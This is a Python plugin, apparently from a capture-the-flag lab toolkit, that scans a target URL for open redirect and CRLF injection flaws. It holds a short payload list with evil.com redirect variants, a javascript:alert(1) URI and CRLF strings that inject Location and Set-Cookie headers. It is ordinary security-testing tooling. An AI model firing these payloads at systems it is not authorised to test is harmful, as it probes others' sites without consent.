"""
plugins/redirect.py — Scanner de Open Redirect e CRLF Injection.

Testa se parâmetros como ?next= ou ?url= podem ser usados para
redirecionar o usuário para domínios maliciosos ou injetar headers.
"""

from __future__ import annotations

from rich.console import Console

from ctflab.core import http as H
from ctflab.core.session import Session
from ctflab.cli.ui import askctx, scan_table

PLUGIN_NAME = "Redirect / CRLF"

_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "javascript:alert(1)",
    "%0d%0aLocation: https://evil.com",  # CRLF
    "/%0d%0aSet-Cookie: test=1",         # CRLF Cookie
]

_COMMON_PARAMS = ["next", "url", "redirect", "dest", "return", "goto", "path"]


def run(s: Session, c: Console) -> None:
    path   = askctx(s, "path", "path", "/login")
    param  = askctx(s, "redir_param", "parâmetro alvo", "next")

    c.print(f"\n[warn]testando {len(_REDIRECT_PAYLOADS)} payloads em {path}?{param}=...[/warn]\n")

    table = scan_table(
        "Redirect / CRLF Scan",
        ["payload", "status", "Location header", "hit?"],
    )

    hits = 0
    with H._make_client(s) as cl:
        for p in _REDIRECT_PAYLOADS:
            try:
                # importante: follow_redirects=False para ver o header Location
                r = cl.get(path, params={param: p}, follow_redirects=False)
                
                loc = r.headers.get("Location", "")
                
                # Critérios de hit:
                # 1. Location contém evil.com
                # 2. Location começa com javascript:
                # 3. Header Set-Cookie apareceu (CRLF injection)
                is_redir = "evil.com" in loc or loc.startswith("javascript:")
                is_crlf  = "test=1" in r.headers.get("Set-Cookie", "")
                
                hit = is_redir or is_crlf
                style = "ok" if hit else "dim"
                
                if hit:
                    hits += 1
                    s.note(f"Redirect hit: {p} -> {loc}")

                table.add_row(
                    p,
                    str(r.status_code),
                    f"[warn]{loc}[/warn]" if loc else "-",
                    "[ok]SIM[/ok]" if hit else "não",
                )

            except Exception as exc:
                table.add_row(p, "[fail]ERR[/fail]", str(exc)[:30], "-")

    c.print(table)
    if hits:
        c.print(f"\n[ok]vulnerabilidade encontrada![/ok]")
    else:
        c.print("\n[dim]nenhum redirect óbvio detectado[/dim]")
